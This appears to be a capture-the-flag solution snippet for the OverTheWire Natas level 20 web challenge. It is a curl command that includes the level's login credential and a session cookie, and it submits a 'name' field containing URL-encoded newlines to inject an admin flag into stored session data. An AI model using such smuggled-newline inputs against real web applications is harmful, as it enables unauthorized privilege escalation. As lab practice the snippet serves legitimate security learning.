id=1
curl -v -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF --cookie \
   PHPSESSID=$id --form "name=paul%0Aadmin 1%0A" \
   http://natas20.natas.labs.overthewire.org?debug=1
